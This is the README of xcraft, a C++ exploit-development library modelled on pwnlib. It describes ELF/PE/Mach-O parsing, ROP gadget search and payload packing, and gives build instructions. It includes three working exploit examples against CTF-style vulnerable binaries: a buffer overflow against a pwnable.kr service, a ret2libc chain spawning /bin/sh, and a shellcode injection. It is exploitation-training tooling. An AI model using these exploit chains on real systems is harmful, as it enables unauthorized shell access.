<p align="center">
<img src="https://github.com/user-attachments/assets/5f5d8e34-faf6-4783-b23a-136d1a768cd6" alt="image" width="200"/>
</p>

# xcraft

> **Casting HeXes - Crafting Exploits - Conjuring shells**  
> A C++ “pwnlib‑style” grimoire for reverse‑engineering and exploit crafting.

xcraft is your arcane toolkit for diving into ELF, PE and Mach‑O artifacts.  
Think of it as pwnlib distilled through a cyber‑alchemist’s lens:

- 🔍 **Binary Parsing**  
  Seamless ELF/PE/Mach‑O introspection  
- 🌀 **ROP & Gadget‑Summoning**  
  Find, filter and chain gadgets in a single incantation  
- ⚓ **Symbol, GOT & PLT Lookup**  
  Resolve functions and pointers at will  
- 🧮 **Bit‑Level Conjuring**  
  Endian‑safe packing/unpacking, cyclic patterns, hex dumps  

xcraft is still in its early chapters, but the forge is hot. Share your own spells (PRs and issue‑reports welcome!).

## Examples

buffer overflow:
```cpp
#include <xcraft/xcraft.hpp>
#include <exception>
#include <iostream>
#include <string_view>

using namespace xcft;

constexpr uint16_t PORT   = 9000;
constexpr uint32_t OFFSET = 0x6161616e;
constexpr uint32_t PASS   = 0xcafebabe;

int main(int argc, char **argv) try {
    auto local = argc > 1 && std::string_view(argv[1]) == "local";

    std::string payload;
    payload += cyclic(cyclic_find(OFFSET));
    payload += p<uint32_t>(PASS);

    using UniqTube = std::unique_ptr<Tube>;

    auto io =
        local ? uniq_tube<Process>("./bin/bof") // the code from pwnable
              : uniq_tube<Remote>("pwnable.kr", PORT);

    io->writeln(payload);
    io->interactive();
} catch (const std::exception &ec) {
    std::cerr << ec.what() << std::endl;
}
```

ret2libc:
```cpp
#include <cstdint>
#include <xcraft/xcraft.hpp>
#include <iostream>

using namespace xcft;

// rip at 0x62616162
constexpr uint32_t RIP = 0x62616162;

int main() try {
    auto elf      = ELF("./bin/vuln");
    auto libc     = ELF("/lib/x86_64-linux-gnu/libc.so.6");
    auto puts_plt = elf.plt()["puts"];
    auto puts_got = elf.got()["puts"];
    auto main_sym = elf.symbols()["main"];
    auto rop      = ROP("./bin/vuln");
    auto pop_rdi  = rop.find_gadget({"pop rdi", "ret"}).at(0);
    auto ret      = rop.find_gadget({"ret"}).at(0);

    auto payload = from_ranges(
        cyclic(cyclic_find(RIP)),
        p<uint64_t>(pop_rdi),
        p<uint64_t>(puts_got),
        p<uint64_t>(ret),
        p<uint64_t>(puts_plt),
        p<uint64_t>(main_sym)
    );
    auto proc = Process("./bin/vuln");
    proc.writeln(payload);
    std::cout << proc.readln() << std::endl;

    auto leak_str = proc.readln();
    hex_println(leak_str);
    auto leak = up<uint64_t>(leak_str);
    std::cout << "0x" << std::hex << leak << std::endl;

    libc.set_address(leak - libc.symbols()["puts"]);
    auto system_sym = libc.symbols()["system"];
    auto bin_sh     = libc.strings()["/bin/sh"];
    auto exit_sym   = libc.symbols()["exit"];

    auto new_payload = from_ranges(
        cyclic(cyclic_find(RIP)),
        p<uint64_t>(pop_rdi),
        p<uint64_t>(bin_sh),
        p<uint64_t>(system_sym),
        p<uint64_t>(exit_sym)
    );
    proc.writeln(new_payload);
    proc.interactive();
} catch (const std::exception &e) {
    std::cerr << e.what() << std::endl;
}
```

shellcode injection:
```cpp
#include <xcraft/xcraft.hpp>
#include <exception>
#include <iostream>
#include <string_view>

using namespace xcft;

// rip clobber at 0x61676161
constexpr uint32_t RIP = 0x62616162;

int main(int argc, char **argv) try {
    auto use_gdb   = argc > 1 && std::string_view(argv[1]) == "use_gdb";
    auto elf       = ELF("./bin/vuln");
    auto jmp_rsp   = elf.search({"jmp rsp"}).at(0);
    auto offset    = cyclic_find(RIP);
    auto shellcode = linux_sh_x64();

    std::string payload;
    payload += cyclic(offset);
    payload += p<uint64_t>(jmp_rsp);
    payload += shellcode;

    auto vuln = "./bin/vuln";
    auto proc = use_gdb ? Gdb::debug(vuln, "b main\nc\n") : Process(vuln);
    proc.writeln(payload);
    proc.interactive();
} catch (const std::exception &ec) {
    std::cerr << ec.what() << std::endl;
}
```

## Dependencies
- asio
- subprocess.h
- magic-enum
- fmtlib
- LIEF
- capstone
- keystone
- googletest (for tests)

The CMake script uses FetchContent to grab the dependencies and build them. I haven't had the chance to automate things via vcpkg or conan mainly due to missing dependencies there (LIEF and Keystone).
The dependencies are private to xcraft and their headers are not exposed to the developer.

## Requirements
C++20 compiler. CMake > 3.18.

## Building
```bash
git clone https://github.com/MoAlyousef/xcraft
cd xcraft
# configure
cmake -Bbin -GNinja
# build
cmake --build bin
```

By default this builds a shared library libxcraft, this provides better link times.
To disable this, use `-DXCFT_BUILD_SHARED=OFF` in the configure step.

The default configure step will not build the examples nor the tests. To build those, use `-DXCFT_BUILD_EXAMPLES=ON` and `-DXCFT_BUIILD_TESTS=ON`.

A vulnerable source code in `examples/vuln.c` is used for the examples. Its not built by CMake. If you would like to build it you can use `gcc -o bin/vuln examples/vuln.c -zexecstack -fno-stack-protector -no-pie -D_FORTIFY_SOURCE=0`.

You can use CMake's FetchContent to incorporate xcraft into your project:
```cmake
include(FetchContent)
FetchContent_Declare(
  xcraft
  GIT_REPOSITORY https://github.com/MoAlyousef/xcraft
  GIT_SHALLOW    True
)
FetchContent_MakeAvailable(xcraft)
```

Otherwise, you can build the project and use the generated xcraft shared library and the public headers in `include/xcraft`.
